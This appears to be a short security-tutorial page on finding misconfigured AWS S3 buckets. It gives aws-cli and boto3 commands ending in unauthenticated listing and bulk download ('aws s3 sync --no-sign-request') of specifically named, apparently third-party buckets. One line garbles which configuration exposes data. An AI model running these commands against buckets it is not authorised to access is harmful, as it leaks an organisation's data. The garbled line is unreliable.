---
description: S3 Bucket on misconfiguration and exploitation.
---

# S3 Bucket Misconfiguration

Today we are going to check s3 bucket security:&#x20;

1. Install **aws-cli** and config aws credentials using the command:&#x20;

```bash
aws configure
```

2. Create a python script to list out the s3-buckets:&#x20;

```python
import boto3
s3 = boto3.resource('s3')
for bucket in s3.buckets.all():
        print(bucket.name)

```

You'll get list of aws s3 buckets on your aws account.

3. Now, try to check out the s3 buckets manually with the given link:&#x20;

```url
https://s3.ap-south-1.amazonaws.com/$s3-bucketname
```

* If the s3 bucket is not misconfiguration, it will display all data with documents on the page.&#x20;
* If the s3 bucket is configured, it will show access denied to third party.

4. List out all files in the s3 bucket:

```bash
aws s3 ls s3://hicare/ --no-sign-request --region ap-south-1
```

5. Download all s3 bucket files from s3 to localhost using awscli:

```bash
aws s3 sync s3://hicare-others/ ~/Documents/HiCare --no-sign-request --region ap-south-1

```

`The goal of this testing is to prevent/secure the aws s3 bucket from the attacker. This will lead to very critical situation to any company if org data became leaked.`
